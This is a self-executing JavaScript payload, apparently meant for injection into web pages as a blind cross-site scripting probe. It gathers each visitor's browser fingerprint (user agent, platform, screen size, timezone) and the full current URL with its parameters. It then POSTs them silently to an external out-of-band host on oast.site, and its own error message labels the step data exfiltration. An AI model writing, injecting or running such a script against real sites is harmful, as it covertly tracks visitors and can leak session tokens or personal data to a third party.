(function() {
  // Collect a variety of browser and system information
  var fingerprintData = {
    // Basic navigator properties
    userAgent: navigator.userAgent,
    platform: navigator.platform,
    language: navigator.language,
    hardwareConcurrency: navigator.hardwareConcurrency,

    // Screen and viewport dimensions
    screenWidth: screen.width,
    screenHeight: screen.height,
    viewportWidth: window.innerWidth,
    viewportHeight: window.innerHeight,

    // Timezone and color depth
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    colorDepth: screen.colorDepth,

    // Add the current full URL, including path and parameters
    currentUrl: window.location.href
  };

  // Send the collected data to your server
  fetch('https://prrvegwlexmerbgbbncaomvyjy4knangn.oast.site/log', {
    method: 'POST',
    mode: 'no-cors',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify(fingerprintData)
  }).catch(error => {
    // Handle potential errors, e.g., if the server is down
    console.error('Data exfiltration failed:', error);
  });
})();
